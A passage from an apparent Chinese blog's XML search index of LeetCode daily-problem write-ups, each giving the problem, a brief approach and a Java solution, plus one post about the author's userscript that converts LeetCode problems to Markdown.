    <content type="text"><![CDATA[题目：228. 汇总区间难度：简单 给定一个无重复元素的有序整数数组 nums 。 返回 恰好覆盖数组中所有数字 的 最小有序 区间范围列表。也就是说，nums 的每个元素都恰好被某个区间范围所覆盖，并且不存在属于某个范围但不属于 nums 的数字 x 。 列表中的每个区间范围 [a,b] 应该按如下格式输出： “a-&gt;b” ，如果 a != b “a” ，如果 a == b 示例 1： 123456输入：nums = [0,1,2,4,5,7]输出：[&quot;0-&gt;2&quot;,&quot;4-&gt;5&quot;,&quot;7&quot;]解释：区间范围是：[0,2] --&gt; &quot;0-&gt;2&quot;[4,5] --&gt; &quot;4-&gt;5&quot;[7,7] --&gt; &quot;7&quot; 示例 2： 1234567输入：nums = [0,2,3,4,6,8,9]输出：[&quot;0&quot;,&quot;2-&gt;4&quot;,&quot;6&quot;,&quot;8-&gt;9&quot;]解释：区间范围是：[0,0] --&gt; &quot;0&quot;[2,4] --&gt; &quot;2-&gt;4&quot;[6,6] --&gt; &quot;6&quot;[8,9] --&gt; &quot;8-&gt;9&quot; 示例 3： 12输入：nums = []输出：[] 示例 4： 12输入：nums = [-1]输出：[&quot;-1&quot;] 示例 5： 12输入：nums = [0]输出：[&quot;0&quot;] 提示： 0 &lt;= nums.length &lt;= 20 -231 &lt;= nums[i] &lt;= 231 - 1 nums 中的所有值都 互不相同 nums 按升序排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/summary-ranges/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟过程即可，好像没啥可说的 解题代码123456789101112131415161718192021222324252627class Solution &#123; public List&lt;String&gt; summaryRanges(int[] nums) &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; nums.length;i++) &#123; int start = nums[i]; int j = i + 1; while (j &lt; nums.length &amp;&amp; nums[j] - nums[j - 1] == 1) &#123; j++; &#125; int end = nums[j - 1]; if (start == end) &#123; ans.add(String.valueOf(start)); &#125; else &#123; ans.add(start+"-&gt;"+end); &#125; if (j - 1 &gt; i) &#123; i = j - 1; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/8]]></title>
    <url>%2Fposts%2Fe4b23b98%2F</url>
    <content type="text"><![CDATA[189. 旋转数组难度：中等 给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 示例 1: 123456输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4] 示例 2: 12345输入: [-1,-100,3,99] 和 k = 2输出: [3,99,-1,-100]解释: 向右旋转 1 步: [99,-1,-100,3]向右旋转 2 步: [3,99,-1,-100] 说明: 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 要求使用空间复杂度为 O(1) 的 *原地 * 算法。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/rotate-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 这题有多种解法，我选了最简单的一种，直接模拟，当然，偷懒嘛，效率就略低 解题代码123456789101112class Solution &#123; public void rotate(int[] nums, int k) &#123; k %= nums.length; while (k-- &gt; 0) &#123; int t = nums[nums.length - 1]; for (int i = nums.length - 2;i &gt;= 0;i--) &#123; nums[i + 1] = nums[i]; &#125; nums[0] = t; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/7]]></title>
    <url>%2Fposts%2F740d2609%2F</url>
    <content type="text"><![CDATA[题目：547. 省份数量难度：中等 有 n 个城市，其中一些彼此相连，另一些没有相连。如果城市 a 与城市 b 直接相连，且城市 b 与城市 c 直接相连，那么城市 a 与城市 c 间接相连。 省份 是一组直接或间接相连的城市，组内不含其他没有相连的城市。 给你一个 n x n 的矩阵 isConnected ，其中 isConnected[i][j] = 1 表示第 i 个城市和第 j 个城市直接相连，而 isConnected[i][j] = 0 表示二者不直接相连。 返回矩阵中 省份 的数量。 示例 1： 12输入：isConnected = [[1,1,0],[1,1,0],[0,0,1]]输出：2 示例 2： 12输入：isConnected = [[1,0,0],[0,1,0],[0,0,1]]输出：3 提示： 1 &lt;= n &lt;= 200 n == isConnected.length n == isConnected[i].length isConnected[i][j] 为 1 或 0 isConnected[i][i] == 1 isConnected[i][j] == isConnected[j][i] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-provinces/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 转换为求图的连通分量的个数的问题，然后用dfs搜一次就ok了 解题代码123456789101112131415161718192021222324class Solution &#123; public int findCircleNum(int[][] isConnected) &#123; int ans = 0; boolean[] vis = new boolean[isConnected.length]; for (int i = 0;i &lt; isConnected.length;i++) &#123; if (!vis[i]) &#123; dfs(isConnected,vis,i); ans++; &#125; &#125; return ans; &#125; private void dfs(int[][] map,boolean[] vis,int i) &#123; for (int j = 0;j &lt; map.length;j++) &#123; if (!vis[j] &amp;&amp; map[i][j] == 1) &#123; vis[j] = true; dfs(map,vis,j); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/6]]></title>
    <url>%2Fposts%2F30a169f%2F</url>
    <content type="text"><![CDATA[题目：399. 除法求值难度：中等 给你一个变量对数组 equations 和一个实数值数组 values 作为已知条件，其中 equations[i] = [Ai, Bi] 和 values[i] 共同表示等式 Ai / Bi = values[i] 。每个 Ai 或 Bi 是一个表示单个变量的字符串。 另有一些以数组 queries 表示的问题，其中 queries[j] = [Cj, Dj] 表示第 j 个问题，请你根据已知条件找出 Cj / Dj = ? 的结果作为答案。 返回 所有问题的答案 。如果存在某个无法确定的答案，则用 -1.0 替代这个答案。 注意： 输入总是有效的。你可以假设除法运算中不会出现除数为 0 的情况，且不存在任何矛盾的结果。 示例 1： 123456输入：equations = [[&quot;a&quot;,&quot;b&quot;],[&quot;b&quot;,&quot;c&quot;]], values = [2.0,3.0], queries = [[&quot;a&quot;,&quot;c&quot;],[&quot;b&quot;,&quot;a&quot;],[&quot;a&quot;,&quot;e&quot;],[&quot;a&quot;,&quot;a&quot;],[&quot;x&quot;,&quot;x&quot;]]输出：[6.00000,0.50000,-1.00000,1.00000,-1.00000]解释：条件：a / b = 2.0, b / c = 3.0问题：a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ?结果：[6.0, 0.5, -1.0, 1.0, -1.0 ] 示例 2： 12输入：equations = [[&quot;a&quot;,&quot;b&quot;],[&quot;b&quot;,&quot;c&quot;],[&quot;bc&quot;,&quot;cd&quot;]], values = [1.5,2.5,5.0], queries = [[&quot;a&quot;,&quot;c&quot;],[&quot;c&quot;,&quot;b&quot;],[&quot;bc&quot;,&quot;cd&quot;],[&quot;cd&quot;,&quot;bc&quot;]]输出：[3.75000,0.40000,5.00000,0.20000] 示例 3： 12输入：equations = [[&quot;a&quot;,&quot;b&quot;]], values = [0.5], queries = [[&quot;a&quot;,&quot;b&quot;],[&quot;b&quot;,&quot;a&quot;],[&quot;a&quot;,&quot;c&quot;],[&quot;x&quot;,&quot;y&quot;]]输出：[0.50000,2.00000,-1.00000,-1.00000] 提示： 1 &lt;= equations.length &lt;= 20 equations[i].length == 2 1 &lt;= Ai.length, Bi.length &lt;= 5 values.length == equations.length 0.0 &lt; values[i] &lt;= 20.0 1 &lt;= queries.length &lt;= 20 queries[i].length == 2 1 &lt;= Cj.length, Dj.length &lt;= 5 Ai, Bi, Cj, Dj 由小写英文字母与数字组成 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/evaluate-division/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 转化为图问题，然后利用floyd算法求解 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465class Solution &#123; public double[] calcEquation(List&lt;List&lt;String&gt;&gt; equations, double[] values, List&lt;List&lt;String&gt;&gt; queries) &#123; double[] ans = new double[queries.size()]; // 给结点编号 int number = 0; Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); for (List&lt;String&gt; e : equations) &#123; if (!map.containsKey(e.get(0))) &#123; map.put(e.get(0),number++); &#125; if (!map.containsKey(e.get(1))) &#123; map.put(e.get(1),number++); &#125; &#125; // System.out.println(map); // 建立有向带权图 double[][] graph = new double[number][number]; for (int i = 0;i &lt; equations.size();i++) &#123; List&lt;String&gt; e = equations.get(i); graph[map.get(e.get(0))][map.get(e.get(0))] = 1.0; graph[map.get(e.get(1))][map.get(e.get(1))] = 1.0; graph[map.get(e.get(0))][map.get(e.get(1))] = values[i]; graph[map.get(e.get(1))][map.get(e.get(0))] = 1 / values[i]; &#125; // floyd for (int i = 0;i &lt; number;i++) &#123; for (int j = 0;j &lt; number;j++) &#123; for (int k = 0;k &lt; number;k++) &#123; if (j == k || graph[j][k] != 0.0) &#123; continue; &#125; if (graph[j][i] != 0.0 &amp;&amp; graph[i][k] != 0.0) &#123; graph[j][k]=graph[j][i]*graph[i][k]; &#125; &#125; &#125; &#125; // for (int i = 0;i &lt; graph.length;i++) &#123; // System.out.println(Arrays.toString(graph[i])); // &#125; // 求解 for (int i = 0;i &lt; queries.size();i++) &#123; List&lt;String&gt; e = queries.get(i); // System.out.println(e); if (map.get(e.get(0)) != null &amp;&amp; map.get(e.get(1)) != null) &#123; ans[i] = graph[map.get(e.get(0))][map.get(e.get(1))]; if (ans[i] == 0.0) &#123; ans[i] = -1.0; &#125; &#125; else &#123; ans[i] = -1.0; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>图</tag>
        <tag>floyd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/5]]></title>
    <url>%2Fposts%2F9a034725%2F</url>
    <content type="text"><![CDATA[题目：830. 较大分组的位置难度：简单 在一个由小写字母构成的字符串 s 中，包含由一些连续的相同字符所构成的分组。 例如，在字符串 s = “abbxxxxzyy” 中，就含有 “a”, “bb”, “xxxx”, “z” 和 “yy” 这样的一些分组。 分组可以用区间 [start, end] 表示，其中 start 和 end 分别表示该分组的起始和终止位置的下标。上例中的 “xxxx” 分组用区间表示为 [3,6] 。 我们称所有包含大于或等于三个连续字符的分组为 较大分组 。 找到每一个 较大分组 的区间，按起始位置下标递增顺序排序后 ，返回结果。 示例 1： 123输入：s = &quot;abbxxxxzzy&quot;输出：[[3,6]]解释：&quot;xxxx&quot; 是一个起始于 3 且终止于 6 的较大分组。 示例 2： 123输入：s = &quot;abc&quot;输出：[]解释：&quot;a&quot;,&quot;b&quot; 和 &quot;c&quot; 均不是符合要求的较大分组。 示例 3： 123输入：s = &quot;abcdddeeeeaabbbcd&quot;输出：[[3,5],[6,9],[12,14]]解释：较大分组为 &quot;ddd&quot;, &quot;eeee&quot; 和 &quot;bbb&quot; 示例 4： 12输入：s = &quot;aba&quot;输出：[] 提示： 1 &lt;= s.length &lt;= 1000 s 仅含小写英文字母 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/positions-of-large-groups/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 遍历即可 解题代码1234567891011121314151617181920212223class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; largeGroupPositions(String s) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); int start = i; int j = i + 1; while (j &lt; s.length() &amp;&amp; ch == s.charAt(j)) &#123; j++; &#125; if (j - i &gt;= 3) &#123; int end = j - 1; ans.add(Arrays.asList(start,end)); i = end; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/4]]></title>
    <url>%2Fposts%2Fed0477b3%2F</url>
    <content type="text"><![CDATA[题目：509. 斐波那契数难度：简单 斐波那契数 ，通常用 F(n) 表示，形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是： 12F(0) = 0，F(1) = 1F(n) = F(n - 1) + F(n - 2)，其中 n &gt; 1 给你 n ，请计算 F(n) 。 示例 1： 123输入：2输出：1解释：F(2) = F(1) + F(0) = 1 + 0 = 1 示例 2： 123输入：3输出：2解释：F(3) = F(2) + F(1) = 1 + 1 = 2 示例 3： 123输入：4输出：3解释：F(4) = F(3) + F(2) = 2 + 1 = 3 提示： 0 &lt;= n &lt;= 30 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/fibonacci-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用斐波那契数列的递推公式，直接使用动态规划递推出结果即可，当然，基于这个想法，空间可以进一步压缩，而不需要开辟一个比较大的数组 解题代码1234567891011121314151617class Solution &#123; public int fib(int n) &#123; if (n == 0) &#123; return 0; &#125; int f[] = new int[n + 1]; f[0] = 0; f[1] = 1; for (int i = 2;i &lt; f.length;i++) &#123; f[i] = f[i - 1] + f[i - 2]; &#125; return f[n]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/3]]></title>
    <url>%2Fposts%2F7360e210%2F</url>
    <content type="text"><![CDATA[题目：86. 分隔链表难度：中等 给你一个链表和一个特定值 x ，请你对链表进行分隔，使得所有小于 x 的节点都出现在大于或等于 x 的节点之前。 你应当保留两个分区中每个节点的初始相对位置。 示例： 12输入：head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3输出：1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/partition-list/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 遍历的过程中，用两个链表分别记录需要分割的节点，最后拼接起来即可 解题代码1234567891011121314151617181920212223242526272829303132/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode partition(ListNode head, int x) &#123; ListNode h1 = new ListNode(-1); ListNode c1 = h1; ListNode h2 = new ListNode(-1); ListNode c2 = h2; ListNode cur = head; while (cur != null) &#123; if (cur.val &lt; x) &#123; c1.next = new ListNode(cur.val); c1 = c1.next; &#125; else &#123; c2.next = new ListNode(cur.val); c2 = c2.next; &#125; cur = cur.next; &#125; c1.next = h2.next; return h1.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于油猴的力扣题目转换工具 html转markdown 便于写题解]]></title>
    <url>%2Fposts%2Ff027b6b4%2F</url>
    <content type="text"><![CDATA[描述刷力扣的时候，写题解是好习惯，但是每次复制题目，都需要手动修改成markdown格式的，挺麻烦的，于是借助油猴脚本插件，写了这个力扣题目转换工具，功能是将html格式的题目，转换成markdown格式的题目，一键复制粘贴即可很愉快的去写题解了 使用 首先在浏览器安装油猴插件 然后从 https://gitee.com/zimolove3/leetcode-helper/raw/main/leetcode-helper.user.js 导入油猴脚本 打开力扣题目，你会发现加载了脚本，选择图中所示复制题目到剪切板即可 复制成功 源代码开源地址：https://github.com/ZimoLoveShuang/leetcode-helper]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>油猴脚本</tag>
        <tag>html</tag>
        <tag>markdown</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/2]]></title>
    <url>%2Fposts%2F467d286%2F</url>
    <content type="text"><![CDATA[题目：239. 滑动窗口最大值难度：困难 给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。滑动窗口每次只向右移动一位。 返回滑动窗口中的最大值。 示例 1： 1234567891011输入：nums = [1,3,-1,-3,5,3,6,7], k = 3输出：[3,3,5,5,6,7]解释：滑动窗口的位置 最大值--------------- -----[1 3 -1] -3 5 3 6 7 3 1 [3 -1 -3] 5 3 6 7 3 1 3 [-1 -3 5] 3 6 7 5 1 3 -1 [-3 5 3] 6 7 5 1 3 -1 -3 [5 3 6] 7 6 1 3 -1 -3 5 [3 6 7] 7 示例 2： 12输入：nums = [1], k = 1输出：[1] 示例 3： 12输入：nums = [1,-1], k = 1输出：[1,-1] 示例 4： 12输入：nums = [9,11], k = 2输出：[11] 示例 5： 12输入：nums = [4,-2], k = 2输出：[4] 提示： 1 &lt;= nums.length &lt;= 105 -104 &lt;= nums[i] &lt;= 104 1 &lt;= k &lt;= nums.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sliding-window-maximum/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 维护一个递减的单调队列即可 解题代码1234567891011121314151617181920212223242526class Solution &#123; public int[] maxSlidingWindow(int[] nums, int k) &#123; int n = nums.length; Deque&lt;Integer&gt; deque = new LinkedList&lt;Integer&gt;(); for (int i = 0; i &lt; k; ++i) &#123; while (!deque.isEmpty() &amp;&amp; nums[i] &gt;= nums[deque.peekLast()]) &#123; deque.pollLast(); &#125; deque.offerLast(i); &#125; int[] ans = new int[n - k + 1]; ans[0] = nums[deque.peekFirst()]; for (int i = k; i &lt; n; ++i) &#123; while (!deque.isEmpty() &amp;&amp; nums[i] &gt;= nums[deque.peekLast()]) &#123; deque.pollLast(); &#125; deque.offerLast(i); while (deque.peekFirst() &lt;= i - k) &#123; deque.pollFirst(); &#125; ans[i - k + 1] = nums[deque.peekFirst()]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>单调队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/1]]></title>
    <url>%2Fposts%2F9d6e833c%2F</url>
    <content type="text"><![CDATA[题目：605. 种花问题难度：简单 假设有一个很长的花坛，一部分地块种植了花，另一部分却没有。可是，花不能种植在相邻的地块上，它们会争夺水源，两者都会死去。 给你一个整数数组 flowerbed 表示花坛，由若干 0 和 1 组成，其中 0 表示没种植花，1 表示种植了花。另有一个数 n，能否在不打破种植规则的情况下种入 n朵花？能则返回 true ，不能则返回 false。 示例 1： 12输入：flowerbed = [1,0,0,0,1], n = 1输出：true 示例 2： 12输入：flowerbed = [1,0,0,0,1], n = 2输出：false 提示： 1 &lt;= flowerbed.length &lt;= 2 * 104 flowerbed[i] 为 0 或 1 flowerbed 中不存在相邻的两朵花 0 &lt;= n &lt;= flowerbed.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/can-place-flowers/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 注意到 连续的三个0，那么这三个0中间的位置一定可以种花 小细节就是首尾各插入一个0确保边界被考虑到了 解题代码12345678910111213141516171819class Solution &#123; public boolean canPlaceFlowers(int[] flowerbed, int n) &#123; int[] flowers = new int[flowerbed.length + 2]; for (int i = 0;i &lt; flowerbed.length;i++) &#123; flowers[i + 1] = flowerbed[i]; &#125; int index = 0; while (index + 2 &lt; flowers.length) &#123; if (flowers[index] == 0 &amp;&amp; flowers[index + 1] == 0 &amp;&amp; flowers[index + 2] == 0) &#123; flowers[index + 1] = 1; n--; &#125; index++; &#125; return n &lt;= 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/31]]></title>
    <url>%2Fposts%2Ff1924b72%2F</url>
    <content type="text"><![CDATA[题目：435. 无重叠区间难度：中等 给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。 注意: 可以认为区间的终点总是大于它的起点。 区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。 示例 1: 12345输入: [ [1,2], [2,3], [3,4], [1,3] ]输出: 1解释: 移除 [1,3] 后，剩下的区间没有重叠。 示例 2: 12345输入: [ [1,2], [1,2], [1,2] ]输出: 2解释: 你需要移除两个 [1,2] 来使剩下的区间没有重叠。 示例 3: 12345输入: [ [1,2], [2,3] ]输出: 0解释: 你不需要移除任何区间，因为它们已经是无重叠的了。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/non-overlapping-intervals著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 计算区间集合能组成的最长的不重叠区间的长度，用总长度减去之即可 解题代码12345678910111213141516171819202122232425class Solution &#123; public int eraseOverlapIntervals(int[][] intervals) &#123; if (intervals.length &lt; 1) &#123; return 0; &#125; Arrays.sort(intervals,new Comparator&lt;int[]&gt;() &#123; public int compare(int[] a,int[] b) &#123; return a[1] - b[1]; &#125; &#125;); int len = 1; int end = intervals[0][1]; for (int i = 1;i &lt; intervals.length;i++) &#123; if (intervals[i][0] &lt; end) &#123; continue; &#125; end = intervals[i][1]; len++; &#125; return intervals.length - len; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/30]]></title>
    <url>%2Fposts%2F86957be4%2F</url>
    <content type="text"><![CDATA[题目：1046. 最后一块石头的重量难度：简单 有一堆石头，每块石头的重量都是正整数。 每一回合，从中选出两块 最重的 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x &lt;= y。那么粉碎的可能结果如下： 如果 x == y，那么两块石头都会被完全粉碎； 如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。 最后，最多只会剩下一块石头。返回此石头的重量。如果没有石头剩下，就返回 0。 示例： 1234567输入：[2,7,4,1,8,1]输出：1解释：先选出 7 和 8，得到 1，所以数组转换为 [2,4,1,1,1]，再选出 2 和 4，得到 2，所以数组转换为 [2,1,1,1]，接着是 2 和 1，得到 1，所以数组转换为 [1,1,1]，最后选出 1 和 1，得到 0，最终数组转换为 [1]，这就是最后剩下那块石头的重量。 提示： 1 &lt;= stones.length &lt;= 30 1 &lt;= stones[i] &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/last-stone-weight著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟这个过程即可 解题代码1234567891011121314151617181920212223242526272829class Solution &#123; public int lastStoneWeight(int[] stones) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i : stones) &#123; list.add(i); &#125; while (list.size() &gt; 1) &#123; Collections.sort(list); int x = list.get(list.size() - 2); int y = list.get(list.size() - 1); list.remove(list.size() - 1); list.remove(list.size() - 1); if (x != y) &#123; list.add(y - x); &#125; &#125; if (list.size() == 1) &#123; return list.get(0); &#125; return 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/27]]></title>
    <url>%2Fposts%2F1eadf06%2F</url>
    <content type="text"><![CDATA[题目：205. 同构字符串难度：简单 给定两个字符串 s 和 t，判断它们是否是同构的。 如果 s 中的字符可以被替换得到 t ，那么这两个字符串是同构的。 所有出现的字符都必须用另一个字符替换，同时保留字符的顺序。两个字符不能映射到同一个字符上，但字符可以映射自己本身。 示例 1: 12输入: s = &quot;egg&quot;, t = &quot;add&quot;输出: true 示例 2: 12输入: s = &quot;foo&quot;, t = &quot;bar&quot;输出: false 示例 3: 12输入: s = &quot;paper&quot;, t = &quot;title&quot;输出: true 说明:你可以假设 s 和 t 具有相同的长度。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/isomorphic-strings著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接建立哈希表即可 解题代码12345678910111213141516171819202122class Solution &#123; public boolean isIsomorphic(String s, String t) &#123; Map&lt;Character,Character&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char k = s.charAt(i); char v = t.charAt(i); if (map.containsKey(k)) &#123; if (map.get(k) != v) &#123; return false; &#125; &#125; else &#123; if (map.containsValue(v)) &#123; return false; &#125; map.put(k,v); &#125; &#125; return true; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/26]]></title>
    <url>%2Fposts%2F76edef90%2F</url>
    <content type="text"><![CDATA[题目：85. 最大矩形难度：困难 给定一个仅包含 0 和 1 、大小为 rows x cols 的二维二进制矩阵，找出只包含 1 的最大矩形，并返回其面积。 示例 1： 123输入：matrix = [[&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;],[&quot;1&quot;,&quot;0&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;],[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;],[&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;]]输出：6解释：最大矩形如上图所示。 示例 2： 12输入：matrix = []输出：0 示例 3： 12输入：matrix = [[&quot;0&quot;]]输出：0 示例 4： 12输入：matrix = [[&quot;1&quot;]]输出：1 示例 5： 12输入：matrix = [[&quot;0&quot;,&quot;0&quot;]]输出：0 提示： rows == matrix.length cols == matrix[0].length 0 &lt;= row, cols &lt;= 200 matrix[i][j] 为 ‘0’ 或 ‘1’ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximal-rectangle著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 暴力枚举左上角和右下角即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public int maximalRectangle(char[][] matrix) &#123; int m = matrix.length; if (m == 0) &#123; return 0; &#125; int n = matrix[0].length; int[][] left = new int[m][n]; // 记录左上角 for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (matrix[i][j] == '1') &#123; left[i][j] = (j == 0 ? 0 : left[i][j - 1]) + 1; &#125; &#125; &#125; // 枚举右下角 int ret = 0; for (int i = 0; i &lt; m; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; if (matrix[i][j] == '0') &#123; continue; &#125; int width = left[i][j]; int area = width; for (int k = i - 1; k &gt;= 0; k--) &#123; width = Math.min(width, left[k][j]); area = Math.max(area, (i - k + 1) * width); &#125; ret = Math.max(ret, area); &#125; &#125; return ret; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>暴力枚举</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/12/25]]></title>
    <url>%2Fposts%2Fefe4be2a%2F</url>
